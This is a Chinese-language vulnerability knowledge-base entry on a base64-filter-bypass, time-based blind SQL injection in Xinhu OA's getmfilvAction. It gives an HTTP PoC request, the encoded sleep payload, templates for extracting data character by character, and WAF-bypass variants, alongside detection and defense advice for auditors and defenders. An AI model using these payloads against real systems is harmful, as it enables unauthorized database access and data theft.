---
id: web-generic-sqli-xinhu-getmfilv-fname-base64-insert
title: 信呼OA getmfilvAction：fname 先 base64decode 后被 insert 拼进 filename，绕过全局黑名单做时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-getmfilv-fname-base64-insert-sqli
tags:
- sqli
- php
- xinhu
- oa
- base64
- filter-bypass
- time-based-blind
- code-audit
- mysql
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:43:42+08:00'
  notes: 已对照原文核对：api.php?m=upload|api&d=task&a=getmfilv 路由、fileid 被 int 强转、fname 经 base64decode 再拼成 filename、record() 拼出 insert into xinhu_file set 语句、黑名单 lvlaras 与绕过成因（过滤作用于 Base64 文本、解码在过滤之后）、响应 6.157s 均与原文及截图一致；base64 载荷 MScgYW5kIHNsZWVwKDYpIw== 解码为 1' and sleep(6)#。删除了原文未给出的 fileid=1 对应 images/logo.png 与具体源码相对路径断言。未验证点：接口能否未授权访问未验证（原文 PoC 带管理员 Cookie）；未本地复跑。
url: /docs/web/generic/sqli/web-generic-sqli-xinhu-getmfilv-fname-base64-insert/
draft: false
kb_aliases:
- 信呼OA SQL 注入
- xinhu getmfilv SQLi
- uploadAction getmfilvAction
- fname 参数注入
- base64decode 绕过过滤
- insert 语句注入
- filename 字段注入
---

## 一句话结论

信呼OA 的 `api.php` 路由到 `uploadAction::getmfilvAction()` 后，参数 `fname` 先经 `$this->jm->base64decode()` 解码、再拼成 `'$fname.$fileext'` 作为 `m('file')->insert($uarr)` 的 `filename` 字段值；而全局 `$rock->get()` 的关键字/引号黑名单只作用于 Base64 文本，于是携带 SQL 载荷的 Base64 串能穿过过滤，最终进入 `insert into xinhu_file set ...` 的字符串拼接，形成时间盲注型 SQL 注入。

## 原理

- **过滤发生在 Base64 文本上**：`$rock->get($name)` 把参数交给 `jmuncode()`，后者对字符串做小写化、遍历 `$lvlaras` 黑名单（`select `、`alter table`、`delete `、`drop `、`update `、`insert into`、`load_file`、`/*`、`*/`、`union`、`sleep(`、`outfile`、`eval(` 等）并替换，再转义单引号。此时输入形如 `MScgYW5kIHNsZWVwKDYpIw==`，只由 `[A-Za-z0-9+/=]` 组成，正则不命中任何关键词。
- **解码发生在过滤之后**：业务方法自己再调一次 `$this->jm->base64decode($this->get('fname'))`，得到 `1' and sleep(6)#`，并把 `isempt()` 判断后的值拼成 `'$fname.'.'.$fileext`。黑名单没有机会看到解码后的引号、`and`、`sleep(`。
- **sink 是 insert 的字段值拼接**：`$uarr` 里 `filename` 为上述拼接结果；`m('file')->insert($uarr)` → `Model::insert()` → `mysqliClass::record()` 逐字段 `$cont .= ",`$key`=".$this->toaddval($val)`，拼出 `insert into xinhu_file set `filename`='<值>',`fileext`='png',...`。`toaddval()` 只给外层加引号、不做内容转义，值里的 `'` 直接闭合字符串，`#` 注释掉后续字段，形成注入。
- **可控参数只有 fname**：`fileid` 被 `(int)$this->get('fileid','0')` 强制转换，无法注入；`fileext` 来自 `file` 表记录、`filepath` 由服务端 `date()/rand()/fileid` 生成，均不控。因此注入点唯一，落在 `filename` 字段。
- **注入上下文**：`filename` 是单引号字符串、SQL 尾部被 `#` 注释，`insert` 语句中无回显通道，优先用 `sleep()` 时间差或布尔条件判断；`#` 之后需要吞掉 `.png` 后缀，原文用 `#.png` 的写法正好让注释符吃掉剩余字段。
- **根的成因**：全局过滤只做“收到字符串”的关键字替换，而业务层又在过滤之后解码，属于“过滤与解码顺序错位”的通用逻辑漏洞，与具体路由无关；同系统其它 `base64decode(` 调用点同样可疑。

## 触发条件

- 目标为存在同样 `getmfilvAction()` 代码的信呼OA 版本（`webmain/task/api/uploadAction.php`），且 `api.php?m=upload|api&d=task` 路由可达（`|` 控制父子模块与文件名拼接）。
- 需要一个存在的 `file` 表记录：`fileid` 必须指向有效行，否则 `getone()` 返回空直接 `returnerror('不存在')`，走不到 insert；原文用 `fileid=1`（`images/logo.png`）。
- `$frs['filepathout']`/`filepath` 指向的文件可被 `file_get_contents` 读取（否则 `createtxt` 前就返回失败）。
- 请求需带有效会话（原文 PoC 携带 `xinhu_ca_adminuser=admin` 等管理员 Cookie，接口是否可未授权访问原文未验证）。
- 数据库为 MySQL，`SLEEP()`/`IF()` 可用；`UPDIR` 目录可写（会实际生成一个 `upload/<年月>/<日>_rocktpl<随机>_<fileid>.<ext>` 文件，并在 `file` 表插入一行）。

## 利用步骤

1. 审计定位：在 `uploadAction::getmfilvAction()` 中找 `base64decode($this->get('fname'))`，确认后续 `$uarr['filename']` 进入 `m('file')->insert()`。
2. 确认前置：先取一个有效 `fileid`（能返回文件信息而不报“不存在”），确认响应里能看到 `filepath`、`fileext`。
3. 构造 `fname` 明文：`1' and sleep(6)#`，Base64 编码为 `MScgYW5kIHNsZWVwKDYpIw==`，URL 编码后作为 `fname` 传入；同时保留 `fileid`、`m=upload|api`、`d=task`、`a=getmfilv`。
4. 发出请求并对比时间：带 `sleep` 的请求响应时间明显拉长（原文约 6.1 秒），把 `sleep(6)` 换成 `if(1=2,sleep(6),0)` 则立即返回，即可确认条件可控。
5. 用 `IF()` + `SUBSTR()`/`ASCII()` 逐字符提取 `database()`、`file` 表字段或管理员相关数据；若 `insert` 报错信息回显在响应里，可改用报错注入。
6. 收尾：该接口每次成功都会写文件并插入记录，测试后清理测试记录与生成文件。

## PoC

```http
GET /api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1
Host: target
Cookie: <有效会话 Cookie>
X-Requested-With: XMLHttpRequest
```

fname 解码后为 `1' and sleep(6)#`，最终拼接出的语句形态：

```sql
insert into `xinhu_file` set `filename`='1' and sleep(6)#.png', `fileext`='png', `filepath`='upload/...', ...
```

布尔/时间判断模板：

```text
fname = base64("1' and if(<条件>,sleep(3),0)#")
fname = base64("1' and if(ascii(substr((select database()),1,1))>64,sleep(3),0)#")
```

原文明文载荷为 `1' and sleep(6)#`（请求响应约 6.1 秒）；本条未在本地复跑。

## 变体与关联

- 变体：同一“先 base64decode 再拼 SQL”的成因在同系统 `inputAction::getselectdataAjax`（`actstr`）、`tableAction::savedbupurlAjax`（`dz`）上各有实例，见 [[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]]；前台实例见 [[web-generic-sqli-xinhu-setwxqy-base64-mobile-getone]]，JSON body 实例见 [[web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth]]。本条与之的差异是**注入点与 sink 不同**：`upload/api` 模块的 `getmfilvAction`，注入字段是 `insert` 语句的 `filename`，且需要有效 `fileid` 与可读文件前置。
- 变体：若 `#` 被过滤或 payload 里不能带空格，可用 `/**/`、`%0a`、`/**/and/**/` 等等价分隔；Base64 文本本身也可再套一层 URL 编码绕过针对编码字符的 WAF。
- 变体：把 `sleep()` 换成 `benchmark()`、把 `and` 换成 `or`，或利用 `insert` 报错（如类型/长度冲突）走报错注入。
- 关联审计点：全局搜 `base64decode(`、`jm->`、`jmuncode(`，关注“解码值进入 SQL/命令/文件路径”的位置；`toaddval()` 这类“只加引号不转义”的拼值函数是 insert 注入的直接成因。
- 边界：目标若在解码后再做一次 SQL 关键字过滤、或改用参数化/预处理，注入失效；`fileid` 无效、文件不存在或目录不可写时链在 `insert` 之前就断掉。

## 检测与防御

- 检测：请求中 `fname` 为 Base64 且解码后含 `'`、`sleep(`、`if(`、`#`；同一会话对 `api.php` 的 `getmfilv` 高频请求且响应时间呈规律性波动；响应时间与 `sleep` 秒数吻合的慢请求。
- 检测：`file` 表出现文件名以 `'` 结尾、含 SQL 关键词或注释符的记录；`upload/` 下出现异常 `_rocktpl*` 文件。
- 防御：`record()/toaddval()` 等拼值路径改为参数化（`mysqli` 预处理或 PDO 绑定），禁止“加引号即安全”；表名/字段名走白名单。
- 防御：`get()`/`jmuncode()` 的解码顺序改为“先解码、再统一校验”，或对明确不需要编码的参数直接拒绝 Base64 形态；不要只依赖一次关键字替换。
- 加固：`getmfilvAction` 对 `fname` 做字符集/长度白名单（如只允许文件名安全字符），`fileid` 之外的前置数据改为服务端派生；错误页不返回 SQL 报错。
